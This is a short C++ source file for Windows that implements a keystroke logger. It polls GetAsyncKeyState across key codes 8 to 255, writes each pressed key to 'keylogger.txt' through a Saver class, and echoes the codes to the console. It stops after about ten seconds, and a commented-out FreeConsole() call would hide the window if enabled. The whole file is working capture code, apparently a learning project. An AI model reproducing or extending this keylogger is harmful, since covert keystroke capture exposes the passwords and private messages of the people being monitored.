#include<iostream>
#include<Windows.h>
#include "Saver.h"
#include <ctime>

extern const char* TEXTFILE = "keylogger.txt";

int main() {
	//FreeConsole();

	int time_taken = 0;
	int i;

	time_t start_time, end_time;
	std::cout << "Starting Key Logger\n";
	Saver filesaver = Saver(TEXTFILE);
	time(&start_time);

	while (time_taken<10) {
		Sleep(10);
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) & 0x0001) {
				filesaver.Save(i);
				std::cout << i<<"\n";
			}
		}
		time(&end_time);
		//std::cout << time_taken<<"\n";
		time_taken = end_time - start_time;
	}

	return 0;
}